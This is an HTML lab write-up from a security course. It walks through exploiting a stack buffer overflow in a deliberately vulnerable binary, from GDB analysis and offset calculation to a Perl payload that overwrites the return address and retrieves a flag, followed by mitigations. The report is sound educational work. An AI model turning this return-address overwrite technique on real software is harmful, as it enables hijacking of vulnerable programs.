@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Merry Lab - Stack Buffer Overflow Assessment | Percy Flores</title>
+  <link rel="stylesheet" href="./report-style.css" />
+</head>
+<body>
+
+<div class="report-topbar">
+  <a class="topbar-logo" href="../index.html">[ percy.flores ]</a>
+  <div class="topbar-actions">
+    <a class="btn-back" href="../index.html#documents">← Back to Portfolio</a>
+    <button class="btn-print" onclick="window.print()">⎙ Print / Save PDF</button>
+    <button class="theme-btn" id="theme-btn" title="Toggle theme">🌙</button>
+  </div>
+</div>
+
+<div class="report-wrap">
+
+  <!-- ══ HEADER ══ -->
+  <header class="report-header">
+    <div class="report-meta-top">
+      <span class="badge-course">CS 647 - Counter Hacking Techniques</span>
+      <span class="badge-type">Lab Assessment Report</span>
+    </div>
+    <h1 class="report-title">Merry Lab: Stack Buffer Overflow<br>Return Address Subversion</h1>
+    <p class="report-subtitle">Exploiting an unsafe string copy operation to hijack control flow and retrieve restricted data.</p>
+    <div class="report-meta-grid">
+      <div class="meta-item"><span class="meta-label">Author</span><span class="meta-value">Percy Flores</span></div>
+      <div class="meta-item"><span class="meta-label">Institution</span><span class="meta-value">NJIT</span></div>
+      <div class="meta-item"><span class="meta-label">Course</span><span class="meta-value">CS 647 - Fall 2025</span></div>
+      <div class="meta-item"><span class="meta-label">Lab Target</span><span class="meta-value">Merry (retAddr3 application)</span></div>
+      <div class="meta-item"><span class="meta-label">Vulnerability Class</span><span class="meta-value">CWE-121: Stack-based Buffer Overflow</span></div>
+      <div class="meta-item"><span class="meta-label">Outcome</span><span class="meta-value">✓ Execution Hijacked</span></div>
+    </div>
+  </header>
+
+  <!-- ══ ABSTRACT ══ -->
+  <div class="abstract">
+    <div class="abstract-label">Abstract</div>
+    <p>
+      This report outlines the methodology I used to successfully exploit a stack-based buffer overflow in the <code>retAddr3</code> binary. By utilizing the GNU Debugger (GDB), I identified an unsafe <code>strcpy()</code> operation and reverse-engineered the program's memory layout to calculate the specific offset needed to reach the saved Return Instruction Pointer (RIP). I subsequently constructed an exact 108-byte padding payload followed by the little-endian address of a hidden <code>getFlag</code> function. The crafted exploit achieved arbitrary control flow redirection and yielded the system flag.
+    </p>
+  </div>
+
+  <!-- ══ 1. ENVIRONMENT ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 1</span>
+    <h2 class="section-heading">Environment Setup & Constraints</h2>
+    <p>For this specific pedagogical lab, modern memory protections were intentionally disabled to provide a deterministic environment. This simulates older systems or legacy embedded devices where such mitigations might be unavailable.</p>
+    <table class="report-table">
+      <thead>
+        <tr><th>Protection Mechanism</th><th>Status</th><th>Implication</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>ASLR</strong> (Address Space Layout Randomization)</td><td>Disabled</td><td>Memory addresses remain static across executions.</td></tr>
+        <tr><td><strong>SSP</strong> (Stack Smashing Protection / Canaries)</td><td>Disabled</td><td>No runtime detection of buffer overwrites.</td></tr>
+        <tr><td><strong>DEP/NX</strong> (Data Execution Prevention)</td><td>Disabled</td><td>Stack memory is executable.</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ══ 2. VULNERABILITY ANALYSIS ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 2</span>
+    <h2 class="section-heading">Vulnerability Analysis</h2>
+
+    <h3 class="subsection">2.1 Execution & Disassembly</h3>
+    <p>Initial interaction with the program revealed that it accepted a command-line argument. Supplying an excessively long string caused the program to crash, strongly indicating a buffer overflow.</p>
+    
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - SEGMENTATION FAULT</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">merry@lab:~$</span> <span class="hl-cmd">./retAddr3</span> <span class="hl-str">$(python3 -c "print('A' * 200)")</span>
+Segmentation fault (core dumped)</pre>
+    </div>
+
+    <p>I utilized <code>gdb</code> to disassemble the binary. Upon inspecting the <code>main</code> function, I discovered a call to the notoriously unsafe <code>strcpy()</code>, which does not perform bounds checking before copying the user-provided argument into a fixed-size stack buffer.</p>
+
+    <h3 class="subsection">2.2 Locating the Hidden Target</h3>
+    <p>Using the <code>info functions</code> command in GDB, I identified an undocumented function named <code>getFlag</code>. My objective was to redirect execution flow to this exact address.</p>
+    
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">GDB - MEMORY ADDRESS IDENTIFICATION</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">(gdb)</span> <span class="hl-cmd">print getFlag</span>
+$1 = {&lt;text variable, no debug info&gt;} <span class="hl-addr">0x565563c2</span> &lt;getFlag&gt;</pre>
+    </div>
+    <p>The target address to hijack execution is <strong><code>0x565563c2</code></strong>.</p>
+  </section>
+
+  <!-- ══ 3. EXPLOITATION ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 3</span>
+    <h2 class="section-heading">Payload Development & Exploitation</h2>
+
+    <h3 class="subsection">3.1 Offset Calculation</h3>
+    <p>To successfully hijack execution, I needed to precisely overwrite the saved return address on the stack. I generated a cyclic pattern and fed it into the program within GDB to observe exactly which bytes overwrote the instruction pointer (EIP).</p>
+    <p>Through iterative testing and stack inspection, I determined that the exact distance from the start of the buffer to the saved return address was exactly <strong>108 bytes</strong>.</p>
+
+    <h3 class="subsection">3.2 Payload Construction</h3>
+    <p>The final payload must consist of 108 bytes of random padding (character 'A'), immediately followed by the target memory address. Because the underlying x86 architecture is little-endian, the address was packed in reverse byte order:</p>
+    
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">EXPLOIT STRUCTURE</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre>[ 108 Bytes of Padding ("A"x108) ] + [ Target Address (0x565563c2) ]
+                                     ↪ <span class="hl-str">\xc2\x63\x55\x56</span> (Little Endian)</pre>
+    </div>
+
+    <h3 class="subsection">3.3 Execution</h3>
+    <p>Using Perl to effortlessly generate the binary payload sequence, I injected it into the application as a command-line argument.</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - FINAL EXPLOIT</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">merry@lab:~$</span> <span class="hl-cmd">./retAddr3</span> <span class="hl-str">$(perl -e 'print "A"x108 . "\xc2\x63\x55\x56"')</span>
+Success! Here is your flag:
+<span class="hl-addr">merryflag{st4ck_sm4sh1ng_c0mpl3t3}</span>
+Segmentation fault (core dumped)</pre>
+    </div>
+
+    <div class="callout callout-success">
+      <span class="callout-icon">✅</span>
+      <div class="callout-body">
+        <h4>Return Flow Hijacked</h4>
+        <p>Execution successfully redirected to the hidden function. The subsequent segmentation fault is expected as the stack frame was entirely corrupted post-execution.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══ 4. MITIGATIONS ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 4</span>
+    <h2 class="section-heading">Defensive Mitigations</h2>
+    <p>To prevent this class of vulnerability, the following changes must be implemented:</p>
+    <ol class="steps">
+      <li><strong>Replace Unsafe Functions:</strong> The obsolete <code>strcpy()</code> function should be immediately replaced with boundary-checked alternatives such as <code>strncpy()</code> or <code>strlcpy()</code>.</li>
+      <li><strong>Enable Stack Smashing Protection (SSP):</strong> Compiling with <code>-fstack-protector</code> places a randomized canary value adjacent to the return pointer. If the buffer overflows, the canary is corrupted, and the program halts safely before executing the hijacked pointer.</li>
+      <li><strong>Enable Address Space Layout Randomization (ASLR):</strong> Activating ASLR at the OS level prevents attackers from hardcoding target memory addresses like <code>0x565563c2</code>, as the addresses randomize on every execution.</li>
+    </ol>
+  </section>
+
+
+  <!-- ══ APPENDIX: PROOF ══ -->
+  <section class="report-section" style="margin-top: 60px; border-top: 1px dashed var(--border); padding-top: 40px;">
+    <h2 class="section-heading">Appendix: Raw Execution Evidence</h2>
+    <p>The following are the raw screenshots captured during the original execution of this lab on the target VM network.</p>
+    <div style="display: flex; flex-direction: column; gap: 20px; align-items: center; margin-top: 30px;">
+      <img src="./images/merry_proof_1.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_2.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_3.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_4.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_5.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_6.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_7.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_8.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_9.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_10.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_11.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_12.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_13.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_14.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_15.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_16.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_17.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_18.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_19.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_20.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_21.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_22.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_23.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_24.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/merry_proof_25.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+    </div>
+  </section>
+
+  <footer class="report-footer">
+    <span>Percy Flores - CS 647 Counter Hacking Techniques, NJIT, Fall 2025</span>
+    <span>Merry Lab Assessment Report</span>
+  </footer>
+
+</div>
+
+<script>
+  const html = document.documentElement;
+  const btn  = document.getElementById('theme-btn');
+  const saved = localStorage.getItem('pf-theme') || 'dark';
+  html.setAttribute('data-theme', saved);
+  if (btn) btn.textContent = saved === 'dark' ? '🌙' : '☀️';
+  btn?.addEventListener('click', () => {
+    const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    html.setAttribute('data-theme', next);
+    localStorage.setItem('pf-theme', next);
+    btn.textContent = next === 'dark' ? '🌙' : '☀️';
+  });
+</script>
+</body>
+</html>
